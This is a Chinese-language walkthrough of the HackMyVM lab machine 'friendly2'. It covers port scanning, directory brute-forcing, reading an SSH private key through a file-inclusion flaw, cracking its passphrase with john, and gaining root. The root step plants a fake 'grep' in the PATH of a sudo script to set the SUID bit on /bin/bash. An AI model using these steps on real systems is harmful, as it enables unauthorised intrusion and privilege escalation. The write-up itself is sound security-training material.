# hmv_friendly2

# 0.简介

**靶机**：[hackmyvm - friendly2](https://hackmyvm.eu/machines/machine.php?vm=friendly2)
**难度**：绿色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 09:37 CST
Nmap scan report for 192.168.205.138
Host is up (0.00057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0C:8F:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds

```

# 2.踩点

![Image](https://github.com/user-attachments/assets/0db9dabd-fe97-4b10-ac8c-fea7bb327606)

尝试爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u "http://192.168.205.138" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.138
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, md]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
200      GET       91l      262w     2698c http://192.168.205.138/
301      GET        9l       28w      319c http://192.168.205.138/assets => http://192.168.205.138/assets/
301      GET        9l       28w      318c http://192.168.205.138/tools => http://192.168.205.138/tools/
200      GET       91l      262w     2698c http://192.168.205.138/index.html
200      GET     1710l     9966w   851305c http://192.168.205.138/assets/keyboard.png
200      GET      644l     3260w   244133c http://192.168.205.138/assets/monitor.png
200      GET     1965l    11601w   977099c http://192.168.205.138/assets/laptop.png
200      GET       24l      148w     6861c http://192.168.205.138/assets/sirena.gif
301      GET        9l       28w      328c http://192.168.205.138/tools/documents => http://192.168.205.138/tools/documents/
200      GET       29l       99w      813c http://192.168.205.138/tools/index.html
200      GET       35l      101w      841c http://192.168.205.138/tools/documents/monitor.html
200      GET       50l      126w     1169c http://192.168.205.138/tools/documents/keyboard.html
200      GET       35l      101w      879c http://192.168.205.138/tools/documents/laptop.html
[####################] - 2m    622895/622895  0s      found:13      errors:1      
[####################] - 2m    311410/311410  2719/s  http://192.168.205.138/ 
[####################] - 2s    311410/311410  184157/s http://192.168.205.138/assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2m    311410/311410  2662/s  http://192.168.205.138/tools/ 
[####################] - 0s    311410/311410  7077500/s http://192.168.205.138/tools/documents/ => Directory listing (add --scan-dir-listings to scan)
```

其中`/tools/`目录，我们比较感兴趣

![Image](https://github.com/user-attachments/assets/4cecf106-19df-416e-b3c1-2da93f1dcbf6)

有一个疑似目录包含路径，我们加上尝试

![Image](https://github.com/user-attachments/assets/07421b64-12cb-4fe0-b6e8-48f94239bddc)

再尝试可不可以使用**PHP 过滤器链**

![Image](https://github.com/user-attachments/assets/0788d850-d370-4605-9661-192ba52e50bb)

不行，那我们还是去读它密钥吧

![Image](https://github.com/user-attachments/assets/286bfaa9-f0e2-4543-9ce7-711916d35160)

```bash
┌──(kali㉿kali)-[~/test]
└─$ vim id_rsa 
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ chmod 600 id_rsa
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ ssh gh0st@192.168.205.138 -i id_rsa
The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 

                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ ssh2john id_rsa > hash                             
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ john hash --show                                   
id_rsa:celtic

1 password hash cracked, 0 left
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ ssh gh0st@192.168.205.138 -i id_rsa                
Enter passphrase for key 'id_rsa': 
Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st@friendly2:~$ id
uid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)

```

# 3.提权

```bash
gh0st@friendly2:~$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
gh0st@friendly2:~$ cat /opt/security.sh
#!/bin/bash

echo "Enter the string to encode:"
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"
gh0st@friendly2:~$ ls -la /opt/
total 16
drwxr-xr-x  3 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
drwxr-xr-x  2 root root 4096 Apr 29  2023 0-day
-rwxr-xr-x  1 root root  561 Apr 29  2023 security.sh

```

实现用户输入不超20个字符且不能有特殊符号，将输入信息ROT13 编码，我们改个环境变量就好了，它没用绝对路径

```bash
gh0st@friendly2:/tmp$ echo 'chmod u+s /bin/bash' > grep
gh0st@friendly2:/tmp$ chmod +x grep 
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ sudo PATH=$PWD:$PATH /opt/security.sh
Enter the string to encode:
aaassss
The string cannot contain special characters.
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ bash -p
bash-5.1# id
uid=1001(gh0st) gid=1001(gh0st) euid=0(root) groups=1001(gh0st)
bash-5.1# cat /root/
.bash_history  .bashrc        interfaces.sh  .local/        .profile       root.txt     
bash-5.1# cat /root/root.txt 
Not yet! Try to find root.txt.


Hint: ...
bash-5.1# find / -name "..." 2>/dev/null
/...
bash-5.1# cd /.../
bash-5.1# ls -al
total 12
d-wx------  2 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
-r--------  1 root root  100 Apr 29  2023 ebbg.txt
bash-5.1# cat ebbg.txt 
It's codified, look the cipher:

98199n723q0s44s6rs39r33685q8pnoq



Hint: numbers are not codified

```

![Image](https://github.com/user-attachments/assets/f1d96202-91e2-4915-adb2-fd428994419b)